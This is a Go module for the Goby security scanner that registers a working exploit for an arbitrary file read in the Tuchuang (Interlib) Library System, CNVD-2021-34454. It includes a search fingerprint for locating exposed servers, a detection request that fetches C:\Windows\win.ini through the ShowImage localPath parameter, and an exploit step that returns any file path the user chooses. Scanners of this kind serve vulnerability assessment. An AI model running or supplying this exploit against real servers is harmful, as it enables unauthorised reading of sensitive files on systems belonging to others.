package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Tuchuang Library System Arbitrary Reading File (CNVD-2021-34454)",
  "Description": "Guangzhou Tuchuang Computer Software Development Co., Ltd. is a high-tech enterprise integrating product development, application integration and customer service. Its main goal is to provide high quality application software system design, integration and maintenance services for users in the library industry\\nUsing the vulnerability, an attacker can read arbitrary files on a Windows or Linux server.Using the file reading vulnerability, the attacker can obtain the system file information, thus causing the sensitive information leakage.",
  "Product": "Tuchuang Library System",
  "Homepage": "www.interlib.com.cn",
  "DisclosureDate": "2021-07-03",
  "Author": "luckying1314@139.com",
  "GobyQuery": "body=\"广州图创\" &&body=\"/interlib/common/\"",
  "Level": "2",
  "Impact": "<p>Using the vulnerability, an attacker can read arbitrary files on a Windows or Linux server.Using the file reading vulnerability, the attacker can obtain the system file information, thus causing the sensitive information leakage.<br></p>",
  "Recommandation": "<p>Limit ../ symbol, file download to determine the input path, the best way is that the file should be in the database for one-to-one correspondence, avoid by entering the absolute path to get files<br></p>",
  "References": [
    "https://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247486519&idx=1&sn=99b6d84a7344dff201f1450a31962253&chksm=c07fb7c3f7083ed55e8ccf7312d99dc87ac953d7ed9c3c3403e3af9ead94d552fdb50ae7c74e&scene=178&cur_album_id=1783730541079363585#rd"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "path",
      "type": "createSelect",
      "value": "C://Windows//win.ini,C://Windows//system.ini",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/interlib/report/ShowImage?localPath=C:\\Windows\\win.ini",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "MAPI",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/interlib/report/ShowImage?localPath={{{path}}}",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "SetVariable": [
        "output|lastbody"
      ]
    }
  ],
  "Tags": [
    "fileread"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}